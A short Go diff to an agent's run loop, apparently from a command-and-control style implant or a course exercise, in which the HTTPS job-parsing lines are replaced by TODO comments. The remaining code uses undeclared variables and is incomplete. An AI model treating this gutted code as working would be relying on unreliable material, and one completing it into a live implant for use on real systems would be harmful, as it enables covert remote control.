@@ -83,8 +83,10 @@ func RunLoop(ctx context.Context, comm Agent, cfg *config.AgentConfig) error {
 
 		// Check if there is a job (in case of HTTPS)
 		if currentProtocol == "https" {
-			var httpsResp server.HTTPSResponse
-			if err := json.Unmarshal(response, &httpsResp); err != nil {
+			// TODO: create httpsResp of type server.HTTPSResponse
+			// TODO: unmarshall response into httpResp
+			
+			if err != nil {
 				log.Printf("Error unmarshaling HTTPS response: %v", err)
 			} else {
 				if httpsResp.Job {
